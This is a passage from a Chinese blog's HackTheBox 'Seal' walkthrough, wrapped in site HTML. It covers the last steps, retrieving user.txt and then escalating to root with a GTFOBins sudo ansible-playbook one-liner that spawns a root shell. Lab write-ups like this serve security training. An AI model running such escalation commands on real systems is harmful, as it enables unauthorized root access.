+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213213332563.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213213332563"></p>
+<p>更改权限为600后登陆之，登陆成功后即可拿到user.txt。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213205338524.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213205338524"></p>
+<p>root的提权还是通过playbook。gtfobins中给出了通过playbook进行提权的脚本。当然也可以自己写一个。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213213533039.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213213533039"></p>
+<p>命令粘贴如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[&#123;hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]&#125;]&#x27;</span> &gt;<span class="hljs-variable">$TF</span><br>sudo ansible-playbook <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure>
+
+<p>运行后即可拿到root的shell，读root.txt即可。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213210347993.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213210347993"></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox - Seal</div>
+      <div>https://m0ck1ng-b1rd.github.io/2021/12/13/HTB/Seal/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年12月13日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/02/01/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux/" title="Linux提权一文通">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Linux提权一文通</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter">
+                        <span class="hidden-mobile">HackTheBox - BountyHunter</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
